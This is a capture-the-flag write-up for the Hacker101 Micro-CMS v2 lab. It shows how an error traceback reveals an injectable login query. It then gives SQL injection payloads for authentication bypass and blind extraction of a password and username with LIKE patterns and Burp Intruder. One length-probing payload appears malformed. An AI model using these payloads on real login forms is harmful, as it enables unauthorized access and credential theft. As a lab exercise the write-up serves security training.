# Micro-CMS v2

The Changelog shows the security fixes in v2
<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/Hacker101/Micro-CMSv2/src/1.png" alt="1" />
</p>

As said, editing pages require an admin login
<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/Hacker101/Micro-CMSv2/src/2.png" alt="1" />
</p>

### SQLi vulnerability

By putting a **'** in the login fields an error shows up
```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```

We find that
- The backend db is MariaDB, a MySQL like
- MariaDB is connected to python2.7 in file main.py with do_login( )
- The query is the following
```python
'SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')
```

A simple auth bypass results in an **Invalid password**
```
username = ' or 1=1#
password = t
```
<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/Hacker101/Micro-CMSv2/src/3.png" alt="1" />
</p>

Otherwise in an **Unknown user**
```
username = ' or 1=2#
password
```
<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/Hacker101/Micro-CMSv2/src/4.png" alt="1" />
</p>

The code evaluates True or False since the [execute](https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-execute.html) method returns a Boolean value

We can bypass the auth as
```
username = ' union select 'ab' as password#
password = ab
```
<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/Hacker101/Micro-CMSv2/src/5.png" alt="1" />
</p>

but the comment suggests to find a real username/password combination to get the flag

### Blind SQLi

We got no output but we can modify the query itself!

The [LIKE](https://duckduckgo.com/?t=ffab&q=like+sql+w3school&ia=') operator allows to match a pattern for the valid password

We can get **fist** and **last** character as
```
username = ' or password LIKE "x%"#
username = ' or password LIKE "%x"#
```
Where
- **%** matches zero, one or more characters
- **x** will be a char payload in Burp's Intruder

Following [python formatting](https://pyformat.info/) the query will match **x** if password contains it

Since **%** is filtered, it will be replaced with **%%** by the **replace('%', '%%')**

We find **e** as last character and **s** as first


We can get password **length** as
```
username = ' or length(password) "%y"#
```
Where
- **y** will be an int payload in Burp's Intruder

We find **9** as length filtering the results for **Invalid password**

Then the final query will be
```
username='or password like 's§_§§_§§_§§_§§_§§_§§_§e'#&password=a
```
Where
- **s** is the first character
- **_** matches one character
- **e** is the last character

We find password **stephanie**
<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/Hacker101/Micro-CMSv2/src/6.png" alt="1" />
</p>


At the same way find the corresponding username with
```
username='or password='stephanie' and length(username)= §y§#&password=a
username='or password='stephanie' and username like '§_§§_§§_§§_§§_§§_§''#&password=a
```
We find username **pearly**
<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/Hacker101/Micro-CMSv2/src/7.png" alt="1" />
</p>

By logging with **pearly:stephanie** we get the flag!
